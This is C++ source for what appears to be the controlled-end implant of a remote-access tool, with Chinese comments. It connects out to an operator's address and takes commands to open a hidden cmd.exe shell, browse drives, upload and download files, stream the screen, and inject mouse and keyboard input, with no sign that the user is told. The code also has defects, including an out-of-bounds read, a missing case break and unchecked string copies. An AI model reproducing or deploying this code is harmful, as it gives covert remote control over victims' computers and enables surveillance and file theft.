#include "Server.h"
#include<windows.h>
#include <cstring>        // for strcat()
#include <io.h>
using namespace std;

Server::Server()
{
}

Server::~Server()
{
	if (hRead != NULL)
	{
		CloseHandle(hRead);
	}
	if (hWrite != NULL)
	{
		CloseHandle(hWrite);
	}
	if (hCmdWrite != NULL)
	{
		CloseHandle(hCmdWrite);
	}
	if (hCmdRead != NULL)
	{
		CloseHandle(hCmdRead);
	}
}

BOOL Server::CreateServer(const char* szIp, u_short nPort)
{
	//1.创建tcp客户端
	BOOL bRet = m_tcpSocket.CreateSocket();
	if (!bRet)
	{
		cout << "tcp客户端创建失败" << endl;
		return FALSE;
	}

	if (!m_tcpSocket.Connect((char*)szIp, nPort))
	{
		m_tcpSocket.CloseSocket();
		return 0;
	}
	cout << "IP Address:  "<<szIp<<"  Port: "<<nPort<<" 用户已经连接。。。。" << endl;

	//这个线程用来接受屏幕数据，
	HANDLE hHandleSreen = CreateThread(NULL, 0, SreenProc, this, 0, NULL);
	return TRUE;
}



DWORD __stdcall Server::SreenProc(LPVOID lpParam)
{
	Server* pThis = (Server*)lpParam;

	while (TRUE)
	{
		if (pThis->isScreen ==TRUE)
		{
			pThis->SendPreScreen();
		}
	}

	return 0;
}

BOOL Server::RunServer()
{
	while (TRUE)
	{
		//接受包头和数据
		PKGHDR hdr;

		int nRet = m_tcpSocket.Recv( (char*)&hdr,sizeof(hdr));

		//再收包体
		LPBYTE pBuff = NULL;
		if (hdr.m_nLen > 0)
		{
			int nRecved = 0;
			pBuff = new BYTE[hdr.m_nLen];
			while (nRecved < hdr.m_nLen)
			{
				nRet = m_tcpSocket.Recv(
					(char*)(pBuff + nRecved), hdr.m_nLen - nRecved);
				nRecved += nRet;
			}
		}

			//处理数据
			switch (hdr.m_cmd)
			{
			case DT_CMD:
			{
				//启动CMD
				OnCMD();
			}
			break;
			case DT_SENDCMD:
			{
				//执行CMD命令
				OnSendCMD(pBuff, hdr.m_nLen);
			}
			break;
			case DT_GETDIRVERS:
			{
				//获得盘符
				OnGetDrivers();
			}
			break;
			case DT_GETFILEPATH:
			{
				//浏览文件信息
				OnGetFilePATH(pBuff,hdr.m_nLen);
			}
			break;
			case DT_FILE_TAR_PATH:
			{
				//上传文件->获取上传文件路径
				OnCreatrFile(pBuff, hdr.m_nLen);
			}
			break;
			case DT_FILE_UPLOAD:
			{
				//上传文件->开始上传
				OnWriteFile(pBuff, hdr.m_nLen);
			}
			break;
			case  DT_FILE_UPLOAD_OVER:
			{
				//上传 ->文件已经传输完毕
				OnWriteFileOver();
			}
			break;
			case DT_FILE_DOWNLOAD:
			{
				//下载->写入下载 文件数据
				OnCreateUpDownFile(pBuff, hdr.m_nLen);
			}
			break;
			case DT_SCREENSTART:
			{
				//开启远程屏幕线程
				isScreen = TRUE;
			}
			break;
			case DT_SCREENSTOP:
			{
				//停止屏幕共享线程
				isScreen = FALSE;
			}
			case DT_MOUSEMOVE:
			{ 
				//响应鼠标事件
				PONMOUSE pt = (PONMOUSE)pBuff;
				if (pt != nullptr)
				{
					MouseEvent(pt);
				}
			}
			break;
			case  DT_KEYBOADEVENT:
			{
				//响应键盘事件
				UINT* pChar = (UINT*)pBuff;
				if (pChar != nullptr)
				{
					KeyBoardEvent(pChar);
				}
			}
			break;
			default:
				break;
			}
		}
    return 0;
}

//处理鼠标命令
void Server ::MouseEvent(PONMOUSE MousePt)
{
	switch (MousePt->_MouseCmd)
	{
		//处理鼠标移动
	case MOUSEMOVE:
	{
		MouseMove(MousePt);
		printf("当前鼠标坐标x：%d--y：%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case LMOUSEDOWN:
	{
		MouseLbuttonDown(MousePt);
		printf("鼠标左键按下坐标x：%d--y：%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case LMOUSEUP:
	{
		MouseLbuttonUp(MousePt);
		printf("鼠标左键弹起坐标x：%d--y：%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case RMOUSEDOWN:
	{
		MouseRbuttonDown(MousePt);
		printf("鼠标右键按下坐标x：%d--y：%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	case RMOUSEUP:
	{
		MouseRbuttonUp(MousePt);
		printf("鼠标右键弹起坐标x：%d--y：%d\r\n", MousePt->_x, MousePt->_Y);
	}
	break;
	}

	//清理接收的鼠标资源
	if (MousePt != NULL)
	{
		delete[](LPBYTE)MousePt;
	}
}

void Server::KeyBoardEvent(UINT* pChar)
{
	keybd_event(*pChar, 0, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(*pChar, 0, KEYEVENTF_KEYUP, 0);
	Sleep(20);
	printf("按下了%c\r\n", *pChar);
	if (pChar != NULL)
	{
		delete[](LPBYTE)pChar;
	}
}


//打开CMD控制台
void Server::OnCMD()
{
	//同步锁
	g_lock.Lock();
	//子进程需要拿到父进程句柄，需要安全属性
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES),NULL,TRUE };
	//创建管道 1
	BOOL bRet = CreatePipe(&hRead, &hCmdWrite, &sa, 0);
	if (!bRet)
	{
		printf("Create Filed");
		return;
	}
	//创建管道 2
	bRet = CreatePipe(&hCmdRead, &hWrite, &sa, 0);
	if (!bRet)
	{
		printf("Create Filed");
		return;
	}

	//启动子进程 （父进程向子进程发数据，子进程需要拿到父进程句柄）
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	//Sleep(100);
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	ZeroMemory(&pi, sizeof(pi));

	//启动CMD
	TCHAR cmd[MAX_PATH] = "cmd.exe";
	bRet = CreateProcess(
		NULL,
		(LPSTR)"cmd",
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	if (!bRet)
	{
		printf("CreateProcess failed.");
		return;
	}

	DWORD dwBytesAvail = 0;
	char  strBuff[4096] = { 0 };
	DWORD dwBytesReaded = 0;
	Sleep(100);
	ReadFile(hRead, strBuff, 0x1000, &dwBytesReaded, NULL);
	Sleep(100);

	PKGHDR pkgSendCmd;
	pkgSendCmd.m_cmd = DT_CMD; 
	pkgSendCmd.m_nLen = dwBytesReaded+1;
	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);

	memset(strBuff, 0, sizeof(strBuff));  //清空缓冲区
	Sleep(100);
	
	printf("打开cmd控制台");
	g_lock.UnLock();
	
}

//执行CMD
void Server::OnSendCMD(LPBYTE pCmd, DWORD dwSize)
{
	g_lock.Lock();

	DWORD dwBytesWrited = 0;

	WriteFile(                    //写入文件
		hWrite,
		pCmd,
		dwSize,
		&dwBytesWrited,
		NULL);
	Sleep(100);
	DWORD dwBytesAvail = 0;
	char  strBuff[0x10000] = { 0 };
	DWORD dwBytesReaded = 0;
	while (PeekNamedPipe(hRead, NULL, 0, NULL, &dwBytesAvail, NULL)
		&& dwBytesAvail > 0) //循环判断1s内管道中是否有数据，有的话继续循环，没有则退出
	{
	ReadFile(   //读管道数据
		hRead, 
		strBuff, 
		0x10000,
		&dwBytesReaded,
		NULL);
	Sleep(1000);
	printf(strBuff);

	PKGHDR pkgSendCmd;  
	pkgSendCmd.m_cmd = DT_CMD; dwBytesReaded + 1;
	pkgSendCmd.m_nLen = dwBytesReaded + 1;
	m_tcpSocket.Send((char*)&pkgSendCmd, sizeof(pkgSendCmd));
	m_tcpSocket.Send(strBuff, dwBytesReaded + 1);

	memset(strBuff, 0, sizeof(strBuff));  //清空缓冲区
	}

	g_lock.UnLock();
	
}

void Server::OnGetFilePATH(LPBYTE szbuff, DWORD dwSize)
{

	char dirNew[260];
	strcpy(dirNew, (char*)szbuff);
	if (dirNew[-1] != ' \\ ')
	{
		strcat(dirNew, "\\");		// 在目录后面加上"\\*.*"进行第一次搜索
	}
	strcat(dirNew, "*.*");    // 磁盘搜索

	intptr_t handle;
	_finddata_t findData;

	handle = _findfirst(dirNew, &findData);
	if (handle == -1)        // 检查是否成功，失败返回
		return;

	do
	{
		if (findData.attrib & _A_SUBDIR)
		{
			if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
				continue;
			cout <<"名称: "<< dirNew << "    类型：< 文件夹>"
				<< "大小：" << findData.size << "时间" << findData.time_write << endl;

			// 在目录后面加上"\\"和搜索到的目录名进行下一次搜索
			strcpy(dirNew, (char*)szbuff);
			strcat(dirNew, "\\");
			strcat(dirNew, findData.name);


			FILEINFOo pkgFileInfo;
			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
			pkgFileInfo.FileType = 1;
			//pkgFileInfo.FileSize = findData.size;

			
			PKGHDR pkgFile;
			pkgFile.m_cmd = DT_FILEPATH;
			pkgFile.m_nLen = sizeof(pkgFileInfo);
			int nLnepkgFileInfi = sizeof(pkgFile);
			m_tcpSocket.Send((char*)&pkgFile, sizeof(pkgFile));
			m_tcpSocket.Send((char*)&pkgFileInfo, sizeof(pkgFileInfo));

		}
		else if(findData.size)
		{
			cout << "名称：" << dirNew << "    类型：< 文件>"
				<< "大小：" << findData.size << "时间" << findData.time_write << endl;

			// 在目录后面加上"\\"和搜索到的目录名进行下一次搜索
			strcpy(dirNew, (char*)szbuff);
			strcat(dirNew, "\\");
			strcat(dirNew, findData.name);


			FILEINFOo pkgFileInfo;
			memcpy(pkgFileInfo.FileName, dirNew, sizeof(dirNew));
			pkgFileInfo.FileType = 0;
			//pkgFileInfo.FileSize = findData.size;


			PKGHDR pkgFile;
			pkgFile.m_cmd = DT_FILEPATH;
			pkgFile.m_nLen = sizeof(pkgFileInfo);
			int nLnepkgFileInfi = sizeof(pkgFile);
			m_tcpSocket.Send((char*)&pkgFile, sizeof(pkgFile));
			m_tcpSocket.Send((char*)&pkgFileInfo, sizeof(pkgFileInfo));

		}
		
	} while (_findnext(handle, &findData) == 0);

	_findclose(handle);    // 关闭搜索句柄
	/*
	string path = szbuff;
	string FullPathName=path.append("\\*.*");

	HANDLE hFile;

	WIN32_FIND_DATA WFD;
	HANDLE hError;

	hError = ::FindFirstFile(path.c_str(), &WFD);
	if (hError == INVALID_HANDLE_VALUE)
	{
		printf("搜索失败!");
	}
	while (::FindNextFile(hError, &WFD))
	{
		// 过虑.和..
		if (strcmp(WFD.cFileName, ".") == 0
			|| strcmp(WFD.cFileName, "..") == 0)
		{
			continue;
		}
		// 构造完整路径
		FindData.cFileName;
		printf(path.c_str(), "%s\\%s", Path, FindData.cFileName);
		FileCount++;
		// 输出本级的文件
		printf("\n%d  %s  ", FileCount, FullPathName);

		/*
		fileIndex.FileName = str.GetBuffer(0);
		jsonTmp.Add("Name", str.GetBuffer(0));
		str = finder.GetFilePath();
		jsonTmp.Add("NamePath", str.GetBuffer(0));
		BOOL bIs = finder.IsArchived();
		str = bIs ? "1" : "0";
		jsonTmp.Add("IsFile", str.GetBuffer(0));

		json.Add(jsonTmp);

	}

	DATAPACKAGE pkgFilePath;
	pkgFilePath.m_hdr.m_nDataType = DT_FILEPATH;
	pkgFilePath.m_hdr.m_nDataLen = strFilePath.GetLength() + 1;
	pkgFilePath.m_pBuff = strFilePath.GetBuffer(0);
	pThis->m_tcpClient.SendPackage(&pkgFilePath);
			
	*/
}




void Server::OnGetDrivers()
{
	//获取盘符
	char aryBuff[MAXWORD] = { 0 };
	DWORD dwBytes = GetLogicalDriveStrings(sizeof(aryBuff), aryBuff);

	char* lpDriverBuffer = aryBuff;
	while (*lpDriverBuffer != NULL) {
		/*
		DATAPACKAGE pkgDrivers;
		pkgDrivers.m_hdr.m_nDataType = DT_DRIVERS;
		pkgDrivers.m_hdr.m_nDataLen = 0x100;
		pkgDrivers.m_pBuff = lpDriverBuffer;
		m_tcpSocket.SendPackage(&pkgDrivers);
		*/
		PKGHDR pkgGetDrivers;
		pkgGetDrivers.m_cmd = DT_DRIVERS;
		pkgGetDrivers.m_nLen =8 ;
		m_tcpSocket.Send((char*)&pkgGetDrivers, sizeof(pkgGetDrivers));
		m_tcpSocket.Send(lpDriverBuffer, 8);

		string strDriver = lpDriverBuffer;
		lpDriverBuffer = lpDriverBuffer + strDriver.size() + 1;

	}

}

void Server::OnCreatrFile(LPBYTE szbuff, DWORD dwSize)
{
	//创建目标文件
	hFileDst = ::CreateFile(
		(char*)szbuff,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS, //目标文件总是创建新文件,如果文件已经存在,则清掉原文件内容
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFileDst != INVALID_HANDLE_VALUE)
	{
		printf("创建目标文件句柄成功\r\n");
		//delete[] hFileDst;
	}
}

void Server::OnWriteFile(LPBYTE szbuff, DWORD dwSize)
{
	//写入新文件
	DWORD dwBytesToWrite = 0;
	BOOL bRet = ::WriteFile(
		hFileDst,
		szbuff,
		dwSize, //读取了多少字节,就写入多少字节
		&dwBytesToWrite,
		NULL);
	if (bRet)
	{
		printf(" 正在上传文件，已经上传了:%d k\r\n", dwBytesToWrite);
	}
	delete[] szbuff;

}

void Server::OnWriteFileOver()
{
	//文件上传完毕、关闭目标文件句柄
	CloseHandle(hFileDst);
	printf("文件上传完毕");
}

void Server::OnCreateUpDownFile(LPBYTE szbuff, DWORD dwSize)
{
	//打开源文件
	hFileSrc = ::CreateFile(
		(char*)szbuff,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	//每次上传64K
	const DWORD dwPerSize = 0x10000;
	char aryBuff[dwPerSize] = { 0 };

	//获取文件的总大小
	__int64 nTotalFileSize = 0;
	GetFileSizeEx(hFileSrc, (PLARGE_INTEGER)&nTotalFileSize);

	/*
	//发送文件总大小，用于显示进度
	PKGHDR pkgFileSize;
	pkgFileSize.m_cmd = DT_FILE_SIZE;
	pkgFileSize.m_nLen = nTotalFileSize;
	//m_tcpSocket.Send((char*)&pkgFileSize, sizeof(pkgFileSize));
	//m_tcpSocket.Send((char*)"0", nTotalFileSize);
	*/

	//已经处理的数据的大小
	__int64 nHanleFileSize = 0;

	while (true)
	{
		//从源文件读取64K
		DWORD dwBytesToRead = 0;
		BOOL bRet = ::ReadFile(
			hFileSrc,
			aryBuff,
			sizeof(aryBuff),
			&dwBytesToRead, //实际读取的字节数
			NULL);

		// 发送存放读取的字节的缓存区到被控端的新文件
		PKGHDR pkgDownload;
		pkgDownload.m_cmd = DT_FILE_DOWNLOAD;
		pkgDownload.m_nLen = dwBytesToRead;
		m_tcpSocket.Send((char*)&pkgDownload, sizeof(pkgDownload));
		m_tcpSocket.Send(aryBuff, dwBytesToRead);
		printf("文件下载正在读取--%d\r\n", dwBytesToRead);

		//判断文件是否读取完毕
		nHanleFileSize += dwBytesToRead;

		if (nHanleFileSize >= nTotalFileSize)
		{
			// 关闭句柄
			OnWriteFileOverupDown();

			//告诉主控端文件上传完毕、关闭句柄
			PKGHDR pkgDownloadOver;
			pkgDownloadOver.m_cmd = DT_FILE_DOWNLOAD_OVER;
		    pkgDownloadOver.m_nLen = 0;
			m_tcpSocket.Send((char*)&pkgDownloadOver,sizeof(pkgDownloadOver));
			break;
		}
	}
}

void Server::OnWriteFileOverupDown()
{
	//文件上传完毕、关闭打开文件句柄
	CloseHandle(hFileSrc);
	printf("文件下载完毕");
}

void Server :: SendPreScreen()
{

	// 获取窗口当前显示的监视器
	HWND hWnd = GetDesktopWindow();//根据需要可以替换成自己程序的句柄 
	HMONITOR hMonitor = MonitorFromWindow(hWnd, MONITOR_DEFAULTTONEAREST);

	// 获取监视器逻辑宽度与高度
	MONITORINFOEX miex;
	miex.cbSize = sizeof(miex);
	GetMonitorInfo(hMonitor, &miex);
	int cxLogical = (miex.rcMonitor.right - miex.rcMonitor.left);
	int cyLogical = (miex.rcMonitor.bottom - miex.rcMonitor.top);

	// 获取监视器物理宽度与高度
	DEVMODE dm;
	dm.dmSize = sizeof(dm);
	dm.dmDriverExtra = 0;
	EnumDisplaySettings(miex.szDevice, ENUM_CURRENT_SETTINGS, &dm);
	int cxPhysical = dm.dmPelsWidth;
	int cyPhysical = dm.dmPelsHeight;


	//从屏幕拷贝数据到内存位图
	int nScreenWith = GetSystemMetrics(SM_CXSCREEN);
	int nScreenHeigh = GetSystemMetrics(SM_CYSCREEN);


	nScreenWith = cxPhysical;
	nScreenHeigh = cyPhysical;

	HDC hDcScreen = GetDC(NULL);
	HDC hDcMem = CreateCompatibleDC(hDcScreen);
	HBITMAP hBmpMem = CreateCompatibleBitmap(hDcScreen, nScreenWith, nScreenHeigh);
	SelectObject(hDcMem, hBmpMem);
	BitBlt(hDcMem, 0, 0, nScreenWith, nScreenHeigh,
		hDcScreen, 0, 0, SRCCOPY);

	//获取屏幕数据
	DWORD dwBufLen = nScreenHeigh * nScreenWith * sizeof(COLORREF);
	LPBYTE pBuffBmp = new BYTE[dwBufLen];
	GetBitmapBits(hBmpMem, dwBufLen, pBuffBmp);

	//发送屏幕数据
	PKGHDR hdr;
	hdr.m_cmd = DT_SCREENSTART;
	hdr.m_nLen = dwBufLen + sizeof(SCREEN);

	PSCREEN pSreenData = (PSCREEN)new BYTE[hdr.m_nLen];
	pSreenData->m_dwScreenHeigh = nScreenHeigh;
	pSreenData->m_dwScreenWith = nScreenWith;
	pSreenData->m_dwDataLen = dwBufLen;
	memcpy(pSreenData->m_data, pBuffBmp, pSreenData->m_dwDataLen);

	m_tcpSocket.Send( (char*)&hdr, sizeof(hdr));
	m_tcpSocket.Send((char*)pSreenData, hdr.m_nLen);


	delete[] pBuffBmp;
	delete[](LPBYTE)pSreenData;
}

void Server::MouseMove(PONMOUSE MousePt )
{
    HWND hwnd = GetDesktopWindow();
    POINT SreenPt;
    SreenPt.x = MousePt->_x;
    SreenPt.y = MousePt->_Y;

    //HWND hwnd = GetCapture();
    ::ClientToScreen(hwnd, &SreenPt);

    
    ::mouse_event(MOUSEEVENTF_MOVE, MousePt->_x, MousePt->_Y, 0, 0);
    SetCursorPos(MousePt->_x, MousePt->_Y);
}


void Server::MouseLbuttonDown(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
}

void Server::MouseLbuttonUp(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
}

void Server::MouseRbuttonDown(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
}

void Server::MouseRbuttonUp(PONMOUSE MousePt)
{
	HWND hwnd = GetDesktopWindow();
	POINT SreenPt;
	SreenPt.x = MousePt->_x;
	SreenPt.y = MousePt->_Y;


	::ClientToScreen(hwnd, &SreenPt);

	SetCursorPos(MousePt->_x, MousePt->_Y);
	::mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
}

